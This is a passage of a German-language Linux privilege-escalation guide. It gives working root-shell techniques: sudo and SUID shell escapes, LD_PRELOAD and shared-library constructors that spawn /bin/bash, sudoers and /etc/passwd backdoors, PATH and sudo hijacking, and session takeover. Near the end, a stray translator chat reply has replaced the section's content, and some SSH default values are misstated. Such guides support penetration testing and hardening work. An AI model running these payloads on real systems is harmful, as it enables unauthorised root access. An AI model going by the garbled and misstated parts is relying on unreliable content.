<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Erfahre hier, wie man eine D-Bus-Kommunikation enumerate und exploit:**

{{#ref}}
d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **Netzwerk**

Es ist immer interessant, das Netzwerk zu enumerate und die Position der Maschine herauszufinden.

### Allgemeine enumeration
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Offene Ports

Überprüfe immer Netzwerkdienste, die auf der Maschine laufen und mit denen du vor dem Zugriff nicht interagieren konntest:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Prüfe, ob du traffic sniffen kannst. Wenn ja, könntest du einige credentials abgreifen.
```
timeout 1 tcpdump
```
## Benutzer

### Generic Enumeration

Überprüfe **wer** du bist, welche **Privilegien** du hast, welche **Benutzer** in den Systemen sind, welche sich per **login** anmelden können und welche **root privileges** haben:
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Some Linux versions were affected by a bug that allows users with **UID > INT_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Ausnutzen** mit: **`systemd-run -t /bin/bash`**

### Gruppen

Prüfe, ob du **Mitglied einer Gruppe** bist, die dir root-Privilegien gewähren könnte:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Zwischenablage

Überprüfe, ob sich etwas Interessantes in der Zwischenablage befindet (falls möglich)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Passwort-Richtlinie
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Bekannte Passwörter

Wenn du **ein Passwort** der Umgebung kennst, versuche, dich mit dem Passwort **bei jedem Benutzer anzumelden**.

### Su Brute

Wenn es dir nichts ausmacht, viel Lärm zu verursachen, und die Binaries `su` und `timeout` auf dem Rechner vorhanden sind, kannst du versuchen, Benutzer mit [su-bruteforce](https://github.com/carlospolop/su-bruteforce) zu brute-forcen.\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) versucht mit dem Parameter `-a` ebenfalls, Benutzer zu brute-forcen.

## Beschreibbarer PATH-Missbrauch

### $PATH

Wenn du feststellst, dass du **in einen Ordner des $PATH schreiben kannst**, könntest du möglicherweise Rechte eskalieren, indem du **eine Backdoor im beschreibbaren Ordner erstellst** mit dem Namen eines Befehls, der von einem anderen Benutzer (idealerweise root) ausgeführt wird und der **nicht aus einem Ordner geladen wird, der vor deinem beschreibbaren Ordner im $PATH liegt**.

### SUDO and SUID

Du könntest berechtigt sein, einige Befehle mit sudo auszuführen oder sie könnten das suid-Bit gesetzt haben. Prüfe es mit:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Einige **unerwartete Befehle erlauben es, Dateien zu lesen und/oder zu schreiben oder sogar einen Befehl auszuführen.** Zum Beispiel:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Die sudo-Konfiguration könnte einem Benutzer erlauben, einen Befehl mit den Rechten eines anderen Benutzers auszuführen, ohne das Passwort zu kennen.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
In diesem Beispiel kann der Benutzer `demo` `vim` als `root` ausführen; es ist nun trivial, eine Shell zu bekommen, indem man einen ssh key in das root directory hinzufügt oder `sh` aufruft.
```
sudo vim -c '!sh'
```
### SETENV

Diese Direktive ermöglicht dem Benutzer, beim Ausführen von etwas **set an environment variable**:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Dieses Beispiel, **based on HTB machine Admirer**, war **vulnerable** gegenüber **PYTHONPATH hijacking**, um eine beliebige python library zu laden, während das Skript als root ausgeführt wurde:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV durch sudo env_keep erhalten → root shell

Wenn sudoers `BASH_ENV` bewahrt (z. B. `Defaults env_keep+="ENV BASH_ENV"`), kannst du das Startverhalten von Bash bei nicht-interaktiven Shells ausnutzen, um beliebigen Code als root auszuführen, wenn ein erlaubter Befehl aufgerufen wird.

- Why it works: Für nicht-interaktive Shells wertet Bash `$BASH_ENV` aus und liest diese Datei ein, bevor das Zielskript ausgeführt wird. Viele sudo-Regeln erlauben das Ausführen eines Skripts oder eines Shell-Wrappers. Wenn `BASH_ENV` von sudo bewahrt wird, wird deine Datei mit root-Rechten eingelesen.

- Requirements:
- Eine sudo-Regel, die du ausführen kannst (jeder Zielaufruf, der `/bin/bash` nicht-interaktiv startet, oder jedes bash-Skript).
- `BASH_ENV` in `env_keep` vorhanden (prüfe mit `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Härtung:
- Entferne `BASH_ENV` (und `ENV`) aus `env_keep`, bevorzuge `env_reset`.
- Vermeide Shell-Wrapper für sudo-allowed Befehle; verwende möglichst minimale Binaries.
- Erwäge sudo I/O-Logging und Alerting, wenn beibehaltene env vars verwendet werden.

### Pfade zur Umgehung der Sudo-Ausführung

**Jump** um andere Dateien zu lesen oder **symlinks** zu verwenden. Zum Beispiel in der sudoers-Datei: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Wenn ein **wildcard** verwendet wird (\*), ist es noch einfacher:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Gegenmaßnahmen**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/]

### Sudo command/SUID binary ohne Pfadangabe des Befehls

Wenn die **sudo permission** einem einzelnen Befehl **ohne Angabe des Pfads** gegeben wird: _hacker10 ALL= (root) less_ kann man sie ausnutzen, indem man die PATH-Variable ändert.
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Diese Technik kann auch verwendet werden, wenn ein **suid**-Binary **einen anderen Befehl ausführt, ohne den Pfad anzugeben (prüfe immer mit** _**strings**_ **den Inhalt einer seltsamen SUID-Binärdatei)**).

[Payload examples to execute.](payloads-to-execute.md)

### SUID-Binärdatei mit Befehls-Pfad

Wenn die **suid**-Binärdatei **einen anderen Befehl ausführt, bei dem der Pfad angegeben ist**, kannst du versuchen, eine Funktion zu erstellen und zu exportieren, die den Namen des Befehls trägt, den die suid-Datei aufruft.

Zum Beispiel, wenn eine suid-Binärdatei _**/usr/sbin/service apache2 start**_ aufruft, musst du versuchen, die Funktion zu erstellen und zu exportieren:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Wenn du dann das suid binary aufrufst, wird diese Funktion ausgeführt

### LD_PRELOAD & **LD_LIBRARY_PATH**

Die Umgebungsvariable **LD_PRELOAD** wird verwendet, um eine oder mehrere shared libraries (.so-Dateien) anzugeben, die vom Loader vor allen anderen geladen werden sollen, einschließlich der Standard-C-Bibliothek (`libc.so`). Dieser Vorgang ist als Preloading einer Bibliothek bekannt.

Um jedoch die Systemsicherheit zu gewährleisten und zu verhindern, dass diese Funktion ausgenutzt wird, insbesondere bei **suid/sgid**-Executables, erzwingt das System bestimmte Bedingungen:

- Der Loader ignoriert **LD_PRELOAD** für Executables, bei denen die reale Benutzer-ID (_ruid_) nicht mit der effektiven Benutzer-ID (_euid_) übereinstimmt.
- Bei Executables mit suid/sgid werden nur Bibliotheken in Standardpfaden vorab geladen, die ebenfalls suid/sgid sind.

Eine Privilegieneskalation kann auftreten, wenn du Befehle mit `sudo` ausführen darfst und die Ausgabe von `sudo -l` die Anweisung **env_keep+=LD_PRELOAD** enthält. Diese Konfiguration erlaubt, dass die Umgebungsvariable **LD_PRELOAD** erhalten bleibt und auch bei Ausführung von Befehlen mit `sudo` erkannt wird, was möglicherweise zur Ausführung beliebigen Codes mit erhöhten Rechten führt.
```
Defaults        env_keep += LD_PRELOAD
```
Speichere als **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Dann **compile it** mit:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Schließlich, **escalate privileges** ausführen
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Eine ähnliche privesc kann ausgenutzt werden, wenn der Angreifer die **LD_LIBRARY_PATH** env variable kontrolliert, da er so den Pfad bestimmt, in dem nach Bibliotheken gesucht wird.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wenn man auf ein Binary mit **SUID**-Rechten stößt, das ungewöhnlich erscheint, ist es gute Praxis zu überprüfen, ob es **.so**-Dateien korrekt lädt. Das lässt sich prüfen, indem man den folgenden Befehl ausführt:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Zum Beispiel deutet das Auftreten eines Fehlers wie _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ auf ein Potenzial zur Ausnutzung hin.

Um dies auszunutzen, würde man eine C-Datei erstellen, z. B. _"/path/to/.config/libcalc.c"_, die den folgenden Code enthält:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Dieser Code versucht nach dem Kompilieren und Ausführen, Privilegien zu erhöhen, indem er Dateiberechtigungen manipuliert und eine Shell mit erhöhten Rechten ausführt.

Kompiliere die obenstehende C-Datei in eine Shared-Object-Datei (.so) mit:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Schließlich sollte das Ausführen des betroffenen SUID binary den exploit auslösen und eine mögliche Systemkompromittierung erlauben.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Da wir nun ein SUID binary gefunden haben, das eine library aus einem Verzeichnis lädt, in das wir schreiben können, erstellen wir die library in diesem Verzeichnis mit dem erforderlichen Namen:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Wenn Sie einen Fehler wie den folgenden erhalten:
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Das bedeutet, dass die Bibliothek, die Sie erzeugt haben, eine Funktion namens `a_function_name` enthalten muss.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ist eine kuratierte Liste von Unix-Binaries, die von einem Angreifer ausgenutzt werden können, um lokale Sicherheitsbeschränkungen zu umgehen. [**GTFOArgs**](https://gtfoargs.github.io/) ist das Gleiche, aber für Fälle, in denen Sie **nur Argumente injizieren** können.

Das Projekt sammelt legitime Funktionen von Unix-Binaries, die missbraucht werden können, um aus eingeschränkten Shells auszubrechen, Privilegien zu eskalieren oder aufrechtzuerhalten, Dateien zu übertragen, Bind- und Reverse-Shells zu starten und andere Post-Exploitation-Aufgaben zu erleichtern.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Wenn Sie Zugriff auf `sudo -l` haben, können Sie das Tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) verwenden, um zu prüfen, ob es eine Möglichkeit findet, eine sudo-Regel auszunutzen.

### Wiederverwendung von sudo-Token

In Fällen, in denen Sie **sudo access** haben, aber nicht das Passwort, können Sie Privilegien eskalieren, indem Sie **auf die Ausführung eines sudo-Kommandos warten und dann das Session-Token übernehmen**.

Voraussetzungen für eine Privilegieneskalation:

- Sie haben bereits eine Shell als Benutzer "_sampleuser_"
- "_sampleuser_" hat in den **letzten 15 Minuten** `sudo` benutzt (standardmäßig ist das die Dauer des sudo-Tokens, die uns erlaubt, `sudo` zu benutzen, ohne ein Passwort einzugeben)
- `cat /proc/sys/kernel/yama/ptrace_scope` ist 0
- `gdb` ist zugänglich (Sie können es hochladen)

(Sie können `ptrace_scope` vorübergehend mit `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` aktivieren oder dauerhaft, indem Sie `/etc/sysctl.d/10-ptrace.conf` ändern und `kernel.yama.ptrace_scope = 0` setzen)

Wenn alle diese Voraussetzungen erfüllt sind, **können Sie Privilegien eskalieren mit:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Der **erste Exploit** (`exploit.sh`) erstellt das Binary `activate_sudo_token` in _/tmp_. Sie können es verwenden, um **den sudo-Token in Ihrer Sitzung zu aktivieren** (Sie erhalten nicht automatisch eine root-Shell, führen Sie `sudo su` aus):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
Der **zweite exploit** (`exploit_v2.sh`) erstellt eine sh-Shell in _/tmp_, die **root gehört und bei der das setuid-Bit gesetzt ist**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- Der **dritte exploit** (`exploit_v3.sh`) wird **eine sudoers file erstellen**, die **sudo tokens dauerhaft macht und allen Benutzern erlaubt, sudo zu verwenden**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Wenn du **Schreibrechte** in dem Ordner oder für eine der darin erstellten Dateien hast, kannst du das Binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) verwenden, um einen **sudo token für einen Benutzer und eine PID zu erstellen**.\
Zum Beispiel, wenn du die Datei _/var/run/sudo/ts/sampleuser_ überschreiben kannst und eine Shell als dieser Benutzer mit PID 1234 hast, kannst du **sudo-Privilegien erlangen**, ohne das Passwort zu kennen, indem du:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Die Datei `/etc/sudoers` und die Dateien innerhalb von `/etc/sudoers.d` konfigurieren, wer `sudo` verwenden kann und wie. Diese Dateien **können standardmäßig nur vom Benutzer root und der Gruppe root gelesen werden**.\
**Wenn** du diese Datei **lesen** kannst, könntest du **einige interessante Informationen erhalten**, und wenn du **beliebige Dateien schreiben** kannst, wirst du in der Lage sein, **Privilegien zu eskalieren**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Wenn du Schreibzugriff hast, kannst du diese Berechtigung missbrauchen.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Eine andere Möglichkeit, diese Berechtigungen zu missbrauchen:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Es gibt einige Alternativen zum `sudo` binary, wie `doas` für OpenBSD. Denk daran, dessen Konfiguration in `/etc/doas.conf` zu überprüfen.
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Wenn du weißt, dass ein **Benutzer sich üblicherweise an einer Maschine verbindet und `sudo` verwendet**, um Privilegien zu erhöhen, und du eine Shell im Kontext dieses Benutzers erhalten hast, kannst du **eine neue sudo ausführbare Datei erstellen**, die deinen Code als root und danach den Befehl des Benutzers ausführt. Danach **ändere den $PATH** des Benutzerkontexts (zum Beispiel indem du den neuen Pfad in .bash_profile hinzufügst), sodass beim Ausführen von sudo durch den Benutzer deine sudo ausführbare Datei ausgeführt wird.

Beachte, dass wenn der Benutzer eine andere Shell (nicht bash) verwendet, du andere Dateien anpassen musst, um den neuen Pfad hinzuzufügen. Zum Beispiel[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) modifiziert `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Ein weiteres Beispiel findest du in [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Oder so etwas ausführen:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Geteilte Bibliothek

### ld.so

Die Datei `/etc/ld.so.conf` zeigt an, **woher die geladenen Konfigurationsdateien stammen**. Typischerweise enthält diese Datei folgenden Pfad: `include /etc/ld.so.conf.d/*.conf`

Das bedeutet, dass die Konfigurationsdateien aus `/etc/ld.so.conf.d/*.conf` gelesen werden. Diese Konfigurationsdateien **weisen auf andere Verzeichnisse hin**, in denen nach **Bibliotheken** gesucht wird. Zum Beispiel ist der Inhalt von `/etc/ld.so.conf.d/libc.conf` `/usr/local/lib`. **Das bedeutet, dass das System nach Bibliotheken innerhalb von `/usr/local/lib` suchen wird**.

Wenn aus irgendeinem Grund **ein Benutzer Schreibrechte** auf einem der angegebenen Pfade hat: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, einer Datei innerhalb von `/etc/ld.so.conf.d/` oder einem Ordner, auf den in einer Datei innerhalb von `/etc/ld.so.conf.d/*.conf` verwiesen wird, könnte er möglicherweise seine Privilegien erhöhen.\
Siehe **wie man diese Fehlkonfiguration ausnutzt** auf der folgenden Seite:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Durch das Kopieren der lib nach `/var/tmp/flag15/` wird sie vom Programm an dieser Stelle verwendet, wie in der Variable `RPATH` angegeben.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Erstelle dann eine evil library in `/var/tmp` mit `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities stellen einem Prozess eine **Teilmenge der verfügbaren root-Privilegien** bereit. Dadurch werden root **Privilegien in kleinere und unterscheidbare Einheiten aufgespalten**. Jede dieser Einheiten kann dann unabhängig Prozessen zugewiesen werden. So wird die vollständige Menge an Privilegien reduziert, wodurch das Risiko einer Ausnutzung sinkt.\
Lies die folgende Seite, um **mehr über capabilities und deren Missbrauch zu erfahren**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Verzeichnisrechte

In einem Verzeichnis bedeutet das **Bit für "execute"**, dass der betroffene Benutzer "**cd**" in den Ordner wechseln kann.\ Das **"read"**-Bit bedeutet, dass der Benutzer die **Dateien** **auflisten** kann, und das **"write"**-Bit bedeutet, dass der Benutzer **Dateien** **löschen** und **erstellen** kann.

## ACLs

Access Control Lists (ACLs) repräsentieren die sekundäre Ebene diskretionärer Berechtigungen, die in der Lage sind, die traditionellen ugo/rwx-Berechtigungen **zu überschreiben**. Diese Berechtigungen erhöhen die Kontrolle über den Zugriff auf Dateien oder Verzeichnisse, indem sie bestimmten Benutzern, die weder Eigentümer noch Gruppenmitglieder sind, Rechte gewähren oder verweigern. Diese Stufe der **Granularität sorgt für eine genauere Zugriffsverwaltung**. Weitere Details finden Sie [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Gib** dem Benutzer "kali" Lese- und Schreibrechte für eine Datei:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Erhalte** Dateien mit bestimmten ACLs vom System:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Offene shell sessions

In **alten Versionen** kannst du möglicherweise eine **shell** session eines anderen Benutzers (**root**) **hijack**.\
In **neuesten Versionen** kannst du dich nur zu screen sessions von **deinem eigenen User** **connect**. Allerdings könntest du **interessante Informationen innerhalb der Session** finden.

### screen sessions hijacking

**screen sessions auflisten**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**An eine Session anhängen**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Das war ein Problem mit **alten tmux-Versionen**. Ich konnte eine von root erstellte tmux (v2.1) Sitzung als nicht-privilegierter Benutzer nicht hijacken.

**tmux-Sitzungen auflisten**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**An eine Sitzung anhängen**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Sieh dir **Valentine box von HTB** als Beispiel an.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Alle SSL- und SSH-Schlüssel, die auf Debian-basierten Systemen (Ubuntu, Kubuntu, etc) zwischen September 2006 und dem 13. Mai 2008 erzeugt wurden, können von diesem Bug betroffen sein.\
Dieser Bug tritt beim Erstellen eines neuen ssh-Keys in diesen OS auf, da **nur 32.768 Varianten möglich waren**. Das bedeutet, dass alle Möglichkeiten berechnet werden können und **wenn man den ssh public key hat, kann man nach dem entsprechenden private key suchen**. Die berechneten Möglichkeiten findest du hier: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Gibt an, ob die Passwort-Authentifizierung erlaubt ist. Der Standardwert ist `no`.
- **PubkeyAuthentication:** Gibt an, ob die Public-Key-Authentifizierung erlaubt ist. Der Standardwert ist `yes`.
- **PermitEmptyPasswords**: Wenn die Passwort-Authentifizierung erlaubt ist, gibt es an, ob der Server Logins für Accounts mit leerem Passwort erlaubt. Der Standardwert ist `no`.

### PermitRootLogin

Gibt an, ob root sich per ssh einloggen kann, der Standardwert ist `no`. Mögliche Werte:

- `yes`: root kann sich mit Passwort und Private Key anmelden
- `without-password` oder `prohibit-password`: root kann sich nur mit Private Key anmelden
- `forced-commands-only`: root kann sich nur mit Private Key anmelden und nur, wenn die commands-Optionen angegeben sind
- `no` : nein

### AuthorizedKeysFile

Gibt Dateien an, die die public keys enthalten, die für die Benutzer-Authentifizierung verwendet werden können. Sie kann Tokens wie `%h` enthalten, die durch das Home-Verzeichnis ersetzt werden. **Du kannst absolute Pfade angeben** (beginnend mit `/`) oder **relative Pfade vom Home-Verzeichnis des Benutzers**. Zum Beispiel:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Diese Konfiguration zeigt an, dass wenn du versuchst, dich mit dem **private** key des Benutzers "**testusername**" einzuloggen, ssh den public key deines keys mit denen in `/home/testusername/.ssh/authorized_keys` und `/home/testusername/access` vergleichen wird.

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding ermöglicht es dir, **use your local SSH keys instead of leaving keys** (without passphrases!) auf deinem server liegen zu lassen. Dadurch kannst du per ssh **jump** **to a host** und dich von dort **jump to another** host **using** den **key** auf deinem **initial host** verbinden.

Du musst diese Option in `$HOME/.ssh.config` wie folgt setzen:
```
Host example.com
ForwardAgent yes
```
Beachte, dass wenn `Host` auf `*` gesetzt ist, jedes Mal, wenn der Benutzer zu einer anderen Maschine springt, dieser Host auf die keys zugreifen kann (was ein Sicherheitsproblem darstellt).

Die Datei `/etc/ssh_config` kann diese **override** **options** übernehmen und diese Konfiguration erlauben oder verweigern.\
Die Datei `/etc/sshd_config` kann ssh-agent forwarding mit dem Schlüsselwort `AllowAgentForwarding` **allow** oder **denied** setzen (Standard ist allow).

Wenn du feststellst, dass Forward Agent in einer Umgebung konfiguriert ist, lies die folgende Seite, da **du es möglicherweise ausnutzen kannst, um Privilegien zu eskalieren**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interessante Dateien

### Profil-Dateien

Die Datei `/etc/profile` und die Dateien unter `/etc/profile.d/` sind **Skripte, die ausgeführt werden, wenn ein Benutzer eine neue Shell startet**. Daher, wenn du eine dieser Dateien **schreiben oder verändern kannst, kannst du Privilegien eskalieren**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Wenn ein ungewöhnliches Profilskript gefunden wird, sollten Sie es auf **sensible Informationen** prüfen.

### Passwd/Shadow-Dateien

Je nach Betriebssystem können die Dateien `/etc/passwd` und `/etc/shadow` einen anderen Namen haben oder es könnte eine Sicherungskopie vorhanden sein. Daher wird empfohlen, **alle zu finden** und **zu prüfen, ob Sie sie lesen können**, um zu sehen, **ob es Hashes** in den Dateien gibt:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
In einigen Fällen findet man **password hashes** in der Datei `/etc/passwd` (oder in einer entsprechenden Datei).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Beschreibbares /etc/passwd

Erzeuge zuerst ein Passwort mit einem der folgenden Befehle.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Ich habe die Datei src/linux-hardening/privilege-escalation/README.md noch nicht erhalten. Bitte sende den Inhalt der Datei, dann übersetze ich den relevanten englischen Text ins Deutsche (Markdown/Tags bleiben unverändert) und füge den Benutzer `hacker` samt generiertem Passwort hinzu.

Welche Anforderungen soll das Passwort haben? (Standardvorschlag: 16 Zeichen, Groß-/Kleinbuchstaben, Ziffern und Sonderzeichen).
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
